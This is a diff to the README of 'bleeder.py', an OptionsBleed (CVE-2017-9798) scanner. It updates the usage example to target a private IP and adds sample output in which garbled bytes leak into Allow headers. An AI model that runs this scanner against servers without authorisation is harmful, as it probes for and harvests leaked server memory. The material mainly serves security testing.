@@ -31,14 +31,30 @@ optional arguments:
 ## Simple Usage
 
 ```
-python bleeder.py "http://www.example.com"
-    ::OptionsBleed (CVE-2017-9798) Scanner::
+python bleeder.py "http://10.1.2.3" -c 50
 
-[+] scanning http://www.example.com to see if it bleeds!
-[+] checking OPTIONS method
-[+] allow headers detected in OPTIONS response
-[+] scanning with OPTION method...
-[+] 1000 responses captured
-[+] unique results: ['OPTIONS, GET, HEAD, POST']
+        ::OptionsBleed (CVE-2017-9798) Scanner::
+
+[+] scanning http://10.1.2.3 to see if it bleeds!
+[+] checking OPTION method
+[+] allow headers detected in OPTION response
+[+] checking CUSTOM method
+[+] allow headers detected in CUSTOM response
+[+] scanning with OPTIONS method...
+[+] scanning with custom (PULL) method...
+[+] 50 responses captured
+[+] unique results:
+GET,HEAD,allow,HEAD,allow,HEAD,,HEAD,OPTIONS,POST,all,HEAD,
+GET,HEAD,allow,HEAD,,HEAD,OPTIONS,POST,all,HEAD,
+GET,HEAD,╚jφHU,HEAD,,HEAD,,HEAD,,HEAD,,HEAD,,HEAD,OPTIONS,POST,all,HEAD,,HEAD,,,
+GET,HEAD,allow,HEAD,allow,HEAD,,HEAD,OPTIONS,POST,all,HEAD,all,HEAD,
+GET,HEAD,allow,HEAD,OPTIONS,POST,all,HEAD,all,HEAD
+GET,HEAD,allow,HEAD,╚jφHU,HEAD,,HEAD,,HEAD,OPTIONS,POST,,HEAD,all,HEAD,,HEAD,
+GET,HEAD,allow,HEAD,OPTIONS,POST,all,HEAD
+GET,HEAD,allow,HEAD,,HEAD,OPTIONS,POST,all,HEAD,all,HEAD,
+GET,HEAD,allow,HEAD,allow,HEAD,OPTIONS,POST,all,HEAD
+GET,HEAD,allow,HEAD,╚jφHU,HEAD,,HEAD,,HEAD,,HEAD,,HEAD,,HEAD,OPTIONS,POST,all,HEAD,,HEAD,,,
+GET,HEAD,╚jφHU,HEAD,,HEAD,,HEAD,,HEAD,,HEAD,,HEAD,,HEAD,OPTIONS,POST,all,HEAD,,HEAD,,,
+GET,HEAD,allow,HEAD,allow,HEAD,╚jφHU,HEAD,,HEAD,,HEAD,OPTIONS,POST,,HEAD,all,HEAD,,HEAD,
 [+] scan complete!
 ```
